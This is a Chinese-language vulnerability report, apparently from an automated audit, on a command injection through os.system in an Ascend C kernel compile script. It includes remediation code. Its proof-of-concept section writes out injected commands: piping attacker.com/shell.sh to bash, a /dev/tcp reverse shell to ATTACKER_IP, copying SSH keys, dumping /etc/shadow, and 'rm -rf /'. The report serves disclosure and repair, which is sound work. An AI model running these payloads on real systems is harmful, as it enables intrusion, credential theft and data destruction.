# VULN-SEC-003: ascendc_compile_kernel.py 命令注入漏洞深度分析报告

## 基本信息

| 属性 | 值 |
|------|-----|
| 漏洞ID | VULN-SEC-003 |
| 漏洞类型 | 命令注入 (Command Injection) |
| CWE编号 | CWE-78 |
| 严重性 | High |
| 置信度 | 85 (CONFIRMED) |
| 文件位置 | cmake/asc/fwk_modules/util/ascendc_compile_kernel.py:213 |
| 函数名 | ascendc_build |
| 发现者 | security-auditor |

## 漏洞概述

### 漏洞代码片段

```python
# ascendc_compile_kernel.py:183-215
def ascendc_build(self: any):
    op_info = ascendc_op_info.OpInfo(self.op_type, self.op_cfg_ini)
    op_file = op_info.get_op_file()
    op_bin_dir = os.path.join(self.op_output, self.op_soc_ver, op_file)
    os.makedirs(op_bin_dir, exist_ok=True)
    all_tar = []
    sub_cmd = []
    index = 0
    for sh in self.compile_sh:
        tar = op_file + str(index)
        build_path = os.path.join(self.working_dir, "kernel_" + str(index))
        os.makedirs(build_path)
        all_tar.append(tar)
        sub_cmd.append(tar + ":")
        sub_cmd.append(
            "\tcd {} && bash {} --kernel-src=$(CPP) $(PY) $(OUT) $(MAKE)".format(
                build_path, sh
            )
        )
        index += 1
    mkfile = os.path.join(self.working_dir, op_file + ".make")
    with os.fdopen(os.open(mkfile, const_var.WFLAGS, const_var.WMODES), "w") as fd:
        sub_cmd.insert(0, "all: " + " ".join(all_tar))
        fd.write("\n".join(sub_cmd))

    if os.getenv("TILINGKEY_PAR_COMPILE") is None:
        cmd_str = ('export HI_PYTHON=python3 && export ASCEND_CUSTOM_OPP_PATH={} && export TILINGKEY_PAR_COMPILE=1'
                   '&& make -f {} PY={} OUT={} CPP={}')
    else:
        cmd_str = ('export HI_PYTHON=python3 && export ASCEND_CUSTOM_OPP_PATH={} && make -f {} PY={} OUT={} CPP={}')
    # 漏洞点: 使用 os.system 执行拼接的命令字符串
    if os.system(cmd_str.format(self.build_opp_path, mkfile, self.op_impl_py, op_bin_dir, self.op_cpp_file)) != 0:
        raise RuntimeError('Kernel Compilation Error: OpType {} Kernel File {}!'.format(
            self.op_type, self.op_cpp_file))
```

### 漏洞成因

`ascendc_build` 函数使用 `os.system(cmd_str.format(...))` 执行系统命令，存在以下安全问题：

1. **直接使用 `os.system()`**：Python 的 `os.system()` 函数通过系统 shell（如 `/bin/sh`）执行命令
2. **多个参数通过 `.format()` 拼接**：`cmd_str` 字符串中 `{}` 占位符被 5 个参数填充
3. **参数来自 CLI 或文件路径**：
   - `self.build_opp_path` = 工作目录 + "customize"（路径可控）
   - `mkfile` = 工作目录 + op_file + ".make"
   - `self.op_impl_py` = 工作目录下的 Python 文件
   - `op_bin_dir` = `self.op_output` + `self.op_soc_ver` + `op_file`
   - `self.op_cpp_file` = CLI 参数 `args.src_file` (完全可控)

### 数据流追踪

```
CLI 参数解析 (args_parse)
  ├── --src-file -> args.src_file
  ├── --output-path -> args.output_path
  └── --compute-unit -> args.compute_unit

CompileKernel.__init__()
  ├── self.op_cpp_file = os.path.realpath(args.src_file)  # 即使 realpath 也无法阻止 shell 注入
  ├── self.op_output = os.path.realpath(args.output_path)
  └── self.working_dir = cwd + op_type + "_" + op_soc_ver

ascendc_build()
  ├── op_bin_dir = self.op_output + self.op_soc_ver + op_file
  ├── mkfile = self.working_dir + op_file + ".make"
  └── cmd_str.format(build_opp_path, mkfile, op_impl_py, op_bin_dir, self.op_cpp_file)
        └── os.system(cmd_str) [SINK]
```

### 误判澄清

代码使用了 `os.path.realpath()` 对路径进行规范化：
```python
self.op_cpp_file = os.path.realpath(args.src_file)
self.op_output = os.path.realpath(args.output_path)
```

**关键点**：`os.path.realpath()` 只能解析符号链接和规范化路径格式，**无法阻止 shell 元字符注入**。例如：

- `"test.cpp"` → `realpath()` 返回 `/path/to/test.cpp` (正常)
- `"test.cpp; id"` → `realpath()` 尝试解析名为 `test.cpp; id` 的文件，如果文件不存在，返回原始路径，注入仍然有效
- `"$(id)"` → `realpath()` 无法识别 shell 变量，返回包含 `$` 的路径字符串

**结论**：`realpath()` 是路径安全措施，但不是 shell 注入防护措施。

### 入口点分析

从 CMake 脚本调用链看，参数来源有两种：

1. **CMake 变量传递**（func.cmake:245-259）：
```cmake
COMMAND ${_ASCENDC_ENV_VAR} ${ASCEND_PYTHON_EXECUTABLE} ${ASCENDC_CMAKE_SCRIPTS_PATH}/util/ascendc_compile_kernel.py
    --op-type=${BINCMP_OP_TYPE}
    --src-file=${BINCMP_SRC}           # 来自 CMake 变量
    --compute-unit=${BINCMP_COMPUTE_UNIT}
    --output-path=${BINCMP_OUT_DIR}    # 来自 CMake 变量
```

2. **直接 CLI 调用**：
```bash
python ascendc_compile_kernel.py \
    --op-type MyOp \
    --src-file "/path/to/source.cpp" \
    --output-path "/output/dir"
```

攻击者如果能控制这些 CMake 变量或直接调用脚本，就可以注入恶意命令。

## 攻击场景分析

### 场景1: 通过恶意源文件名注入

攻击者创建一个包含 shell 元字符的源文件名：

```bash
# 创建恶意命名的文件
touch "kernel.cpp; curl attacker.com/shell.sh | bash"
# 或
touch "kernel.cpp$(whoami > /tmp/user_info)"
```

然后通过 CLI 调用：
```bash
python ascendc_compile_kernel.py \
    --op-type MyOp \
    --src-file "./kernel.cpp; curl attacker.com/shell.sh | bash" \
    --output-path "/tmp/out"
```

最终执行的命令：
```bash
export HI_PYTHON=python3 && export ASCEND_CUSTOM_OPP_PATH=/work_dir/customize && make -f /work_dir/mk.make PY=/work_dir/py.py OUT=/tmp/out CPP=./kernel.cpp; curl attacker.com/shell.sh | bash
```

Shell 解析为：
1. `export HI_PYTHON=python3 && export ASCEND_CUSTOM_OPP_PATH=/work_dir/customize && make ... CPP=./kernel.cpp`
2. `curl attacker.com/shell.sh | bash` (注入的恶意命令)

### 场景2: 通过输出路径注入

```bash
python ascendc_compile_kernel.py \
    --op-type MyOp \
    --src-file normal.cpp \
    --output-path "/tmp/out$(touch /tmp/injected)"
```

### 场景3: CMake 配置污染

如果攻击者能修改 CMakeLists.txt 或相关配置文件：

```cmake
# 恶意配置
set(BINCMP_SRC "/normal/path.cpp; rm -rf /")
set(BINCMP_OUT_DIR "/output$(id)")
```

### 场景4: 通过环境变量间接注入

```bash
# 如果路径解析依赖环境变量
export ASCEND_OPP_BASE="/opp_base; id > /tmp/pwned"
cmake .. && make
```

## PoC 概念验证

### 基础 PoC (文件创建验证)

```bash
# 创建测试环境
cd /home/pwn20tty/Desktop/opencode_project/cann/5/asc-devkit

# 准备正常配置文件（需要提供必要的 ini 和 tiling lib）
# 这里假设已有合法的配置

# 注入命令创建标记文件
python cmake/asc/fwk_modules/util/ascendc_compile_kernel.py \
    --op-type TestOp \
    --src-file "/dev/null; touch /tmp/VULN_SEC_003_CONFIRMED" \
    --compute-unit Ascend910 \
    --config-ini /path/to/config.ini \
    --tiling-lib /path/to/tiling.so \
    --output-path /tmp/out

# 验证
ls -la /tmp/VULN_SEC_003_CONFIRMED
# 如果文件存在，说明命令注入成功
```

### 反向 Shell PoC

```bash
python cmake/asc/fwk_modules/util/ascendc_compile_kernel.py \
    --op-type TestOp \
    --src-file "/dev/null; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" \
    --compute-unit Ascend910 \
    --config-ini /valid/config.ini \
    --tiling-lib /valid/tiling.so \
    --output-path /tmp/out
```

### 通过 Makefile 漏洞链利用

观察到 `ascendc_build()` 生成的 Makefile 内容：

```makefile
all: target0 target1 ...
target0:
    cd /work/kernel_0 && bash /script.sh --kernel-src=$(CPP) $(PY) $(OUT) $(MAKE)
```

`$(CPP)` 等变量在 shell 执行时会展开，如果 `CPP` 参数包含 shell 命令，会被执行。

```bash
# 利用 Makefile 变量展开
python ascendc_compile_kernel.py \
    --src-file '$(id)' \
    ...
```

### 信息泄露 PoC

```bash
# 复制 SSH 密钥到可访问位置
python ascendc_compile_kernel.py \
    --src-file "/dev/null; cp ~/.ssh/id_rsa /tmp/leaked_key" \
    ...

# 或读取配置文件
python ascendc_compile_kernel.py \
    --src-file "/dev/null; cat /etc/shadow > /tmp/shadow_dump" \
    ...
```

## 影响评估

### 直接影响

| 影响类型 | 严重程度 | 说明 |
|----------|----------|------|
| 任意命令执行 | **Critical** | 通过 os.system() 可执行任意 shell 命令 |
| 构建环境破坏 | High | 可中断编译流程、删除构建产物 |
| 源代码泄露 | High | 可读取项目源代码或敏感文件 |
| 恶意代码植入 | Critical | 可向编译产物中植入后门 |

### 间接影响

1. **编译产物污染**：恶意命令可能修改编译后的内核二进制文件，植入持久化后门
2. **供应链攻击**：如果编译产物被发布，下游用户将受到攻击
3. **开发环境沦陷**：开发者的工作站可能被完全控制

### 前置条件

| 条件 | 必要性 | 说明 |
|------|--------|------|
| 能调用编译脚本 | **必须** | 通过 CLI 或 CMake 构建 |
| 能控制路径参数 | **必须** | src_file 或 output_path 参数 |
| 配置文件存在 | **必须** | 需要 config_ini 和 tiling_lib |
| 脚本执行权限 | 决定影响 | 取决于运行脚本的用户权限 |

### 攻击链分析

```
[攻击入口]
├── CLI 直接调用 --src-file 参数注入
├── CMake 配置文件污染 (BINCMP_SRC 变量)
└── 环境变量注入

[攻击执行]
├── os.system() 执行恶意命令
├── 反向 Shell 获取控制权
└── 文件读写/修改

[后续攻击]
├── 植入后门到编译产物
├── 窃取开发者凭证
└── 横向移动到其他系统
```

## 修复建议

### 推荐: 使用 subprocess 替代 os.system

```python
def ascendc_build(self: any):
    # ... (前面的准备工作保持不变)
    
    # 构建命令列表（不使用 shell 拼接）
    env_vars = {
        'HI_PYTHON': 'python3',
        'ASCEND_CUSTOM_OPP_PATH': self.build_opp_path,
    }
    if os.getenv("TILINGKEY_PAR_COMPILE") is None:
        env_vars['TILINGKEY_PAR_COMPILE'] = '1'
    
    # 使用 subprocess.run 传递命令列表
    result = subprocess.run(
        ['make', '-f', mkfile, 
         f'PY={self.op_impl_py}', 
         f'OUT={op_bin_dir}', 
         f'CPP={self.op_cpp_file}'],
        env={**os.environ, **env_vars},
        cwd=self.working_dir,
        capture_output=True,
        text=True
    )
    
    if result.returncode != 0:
        CommLog.cilog_error(result.stderr)
        raise RuntimeError('Kernel Compilation Error: OpType {} Kernel File {}!'.format(
            self.op_type, self.op_cpp_file))
```

### 备选方案: 参数清洗

```python
def ascendc_build(self: any):
    # ... 
    
    # 清洗参数，移除 shell 元字符
    import shlex
    
    safe_build_opp_path = shlex.quote(self.build_opp_path)
    safe_mkfile = shlex.quote(mkfile)
    safe_op_impl_py = shlex.quote(self.op_impl_py)
    safe_op_bin_dir = shlex.quote(op_bin_dir)
    safe_op_cpp_file = shlex.quote(self.op_cpp_file)
    
    cmd_str = ('export HI_PYTHON=python3 && export ASCEND_CUSTOM_OPP_PATH={} && make -f {} PY={} OUT={} CPP={}')
    
    # 使用清洗后的参数
    if os.system(cmd_str.format(
        safe_build_opp_path, safe_mkfile, safe_op_impl_py, 
        safe_op_bin_dir, safe_op_cpp_file)) != 0:
        raise RuntimeError(...)
```

### 增强验证

```python
import re

def validate_path_param(path: str, param_name: str) -> str:
    """验证路径参数不含 shell 元字符"""
    # 检查 shell 元字符
    dangerous_chars = r'[;|&$`\n\r(){}]'
    if re.search(dangerous_chars, path):
        raise ValueError(f"Parameter {param_name} contains dangerous characters: {path}")
    
    # 检查命令注入模式
    injection_patterns = [
        r'\$\(',  # $(command)
        r'\$\{',  # ${variable}
        r'\`',    # `command`
        r'\|\|',  # ||
        r'&&',    # &&
    ]
    for pattern in injection_patterns:
        if re.search(pattern, path):
            raise ValueError(f"Parameter {param_name} contains command injection pattern: {path}")
    
    # 验证路径存在（可选）
    if not os.path.exists(path):
        raise FileNotFoundError(f"Path does not exist: {path}")
    
    return path

# 在 __init__ 中应用
def __init__(self: any, args: any):
    # 先验证再赋值
    self.op_cpp_file = validate_path_param(
        os.path.realpath(args.src_file), "src_file"
    )
    self.op_output = validate_path_param(
        os.path.realpath(args.output_path), "output_path"
    )
```

### 调用链修复 (CMake 端)

在 `func.cmake` 中增加参数验证：

```cmake
# 验证参数不含特殊字符
function(validate_path_param path param_name)
    if(path MATCHES "[;&|$]")
        message(FATAL_ERROR "Parameter ${param_name} contains dangerous characters: ${path}")
    endif()
endfunction()

validate_path_param(${BINCMP_SRC} "BINCMP_SRC")
validate_path_param(${BINCMP_OUT_DIR} "BINCMP_OUT_DIR")
```

## 修复优先级

| 优先级 | 说明 |
|--------|------|
| **P0 - 立即修复** | 命令注入可完全控制构建环境，影响供应链安全 |

## 与 VULN-SEC-001 的对比

| 特性 | VULN-SEC-001 | VULN-SEC-003 |
|------|--------------|--------------|
| 危险函数 | subprocess.run(shell=True) | os.system() |
| 参数来源 | CLI --pkg-output-dir | CLI --src-file/--output-path + CMake |
| 调用环境 | 打包脚本 | 编译脚本 |
| 有 realpath | 无 | 有（但无效） |
| 影响 | 打包阶段 | 编译阶段（更上游） |

**建议**：这两个漏洞都源于对 `shell=True` 和 `os.system()` 的不当使用，应对项目进行全局审查：

```bash
# 查找所有危险调用
grep -rn "shell=True" --include="*.py" PROJECT_ROOT
grep -rn "os.system(" --include="*.py" PROJECT_ROOT
grep -rn "subprocess.call.*shell" --include="*.py" PROJECT_ROOT
```

---

**报告生成时间**: 2026-04-22  
**分析者**: details-analyzer  
**状态**: CONFIRMED